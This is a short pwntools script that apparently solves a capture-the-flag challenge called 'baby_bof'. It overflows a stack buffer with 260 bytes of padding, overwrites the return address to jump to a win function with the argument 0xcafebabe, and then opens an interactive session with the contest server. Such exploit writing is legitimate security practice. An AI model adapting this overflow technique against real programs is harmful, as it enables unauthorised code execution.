from pwn import * 

#r = process('./baby_bof')
r = remote('tasks.open.kksctf.ru',  10002)

pad = "A" * 260
win_addr = p32(0x080485f6)
arg = p32(0xcafebabe)
r.sendline(pad+win_addr+"AAAA"+arg)
r.interactive()

